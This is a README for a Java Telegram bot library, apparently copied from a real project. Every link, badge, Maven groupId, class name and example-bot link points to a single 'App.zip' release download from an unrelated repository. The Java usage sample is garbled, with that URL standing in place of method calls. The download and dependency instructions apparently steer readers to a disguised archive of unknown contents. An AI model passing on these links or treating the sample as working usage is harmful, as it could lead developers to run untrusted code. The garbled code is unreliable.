# Telegram Bot Java Library
[![Telegram](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)


[![Build Status](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
[![Jitpack](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
[![Maven Central](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
[![MIT License](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)

A simple to use library to create Telegram Bots in Java

## Contributions
Feel free to fork this project, work on it and then make a pull request against **DEV** branch. Most of the times I will accept them if they add something valuable to the code.

Please, **DO NOT PUSH ANY TOKEN OR API KEY**, I will never accept a pull request with that content.

## Webhooks vs GetUpdates
Both ways are supported, but I recommend long polling method.

## Usage

Just import add the library to your project with one of these options:

  1. Using Maven Central Repository:

```xml
    <dependency>
        <groupId>https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip</groupId>
        <artifactId>telegrambots</artifactId>
        <version>2.4.4.5</version>
    </dependency>
```

  2. Using Jitpack from [here](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
  3. Download the jar(including all dependencies) from [here](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)

In order to use Long Polling mode, just create your own bot extending `https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip`.

If you like to use Webhook, extend `https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip`


Once done, you just need to create a `https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip`and register your bots:

```java

    // Example taken from https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip
    public class Main {
        public static void main(String[] args) {
    
            TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
            try {
                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new ChannelHandlers());
                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new DirectionsHandlers());
                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new RaeHandlers());
                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new WeatherHandlers());
                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new TransifexHandlers());
                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new FilesHandlers());
            } catch (TelegramApiException e) {
                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip();
            }
        }
    }

```

For detailed explanation, visite our [How To](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip) (thanks Clevero)


## Example bots
Open them and send them */help* command to get some information about their capabilities:

https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Use custom keyboards**)

https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Basic messages**)

https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Send files by file_id**)

https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Send files uploding them**)

https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Inline support**)

https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Webhook support**)

You can see code for those bots at [TelegramBotsExample](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip) project.

## Telegram Bot API
This library use [Telegram bot API](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip), you can find more information following the link.

## Questions or Suggestions
Feel free to create issues [here](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip) as you need or join the [chat](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)

## License 
MIT License

Copyright (c) 2016 Ruben Bermudez

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
